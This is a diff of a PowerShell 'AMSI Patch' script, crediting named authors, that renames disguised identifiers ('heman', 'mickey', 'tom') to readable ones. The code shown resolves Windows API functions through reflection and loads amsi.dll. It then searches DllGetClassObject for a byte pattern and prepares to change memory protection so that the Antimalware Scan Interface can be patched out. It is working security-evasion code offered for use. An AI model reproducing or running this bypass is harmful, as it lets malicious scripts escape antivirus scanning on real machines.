@@ -1,26 +1,27 @@
-Class heman {
-    static [IntPtr] FindAddress([IntPtr]$mickey, [byte[]]$tom) {
+Write-Host "-- AMSI Patch"
+Write-Host "-- Modified By: Shantanu Khandelwal (@shantanukhande)"
+Write-Host "-- Original Author: Paul Laîné (@am0nsec)"
+Write-Host ""
+
+Class Hunter {
+    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
         while ($true) {
             [int]$count = 0
 
             while ($true) {
-                [IntPtr]$mickey = [IntPtr]::Add($mickey, 1)
-                If ([System.Runtime.InteropServices.Marshal]::ReadByte($mickey) -eq $tom.Get($count)) {
+                [IntPtr]$address = [IntPtr]::Add($address, 1)
+                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                     $count++
-                    If ($count -eq $tom.Length) {
-                        return [IntPtr]::Subtract($mickey, $tom.Length - 1)
+                    If ($count -eq $egg.Length) {
+                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                     }
                 } Else { break }
             }
         }
 
-        return $mickey
+        return $address
     }
 }
-
-
-
-
 function Get-ProcAddress {
     Param(
         [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
@@ -41,9 +42,6 @@ function Get-ProcAddress {
     # Return the address of the function
     return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
 }
-
-
-
 function Get-DelegateType
 {
     Param
@@ -71,7 +69,6 @@ function Get-DelegateType
         
     Write-Output $TypeBuilder.CreateType()
 }
-
 $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
 $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
 $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
@@ -112,7 +109,7 @@ $hModule = $LoadLibrary.Invoke("amsi.dll")
 Write-Host "[+] AMSI DLL Handle: $hModule"
 $DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule, "DllGetClassObject")
 Write-Host "[+] DllGetClassObject address: $DllGetClassObjectAddress"
-[IntPtr]$targetedAddress = [heman]::FindAddress($DllGetClassObjectAddress, $egg)
+[IntPtr]$targetedAddress = [Hunter]::FindAddress($DllGetClassObjectAddress, $egg)
 Write-Host "[+] Targeted address: $targetedAddress"
 
 $oldProtectionBuffer = 0
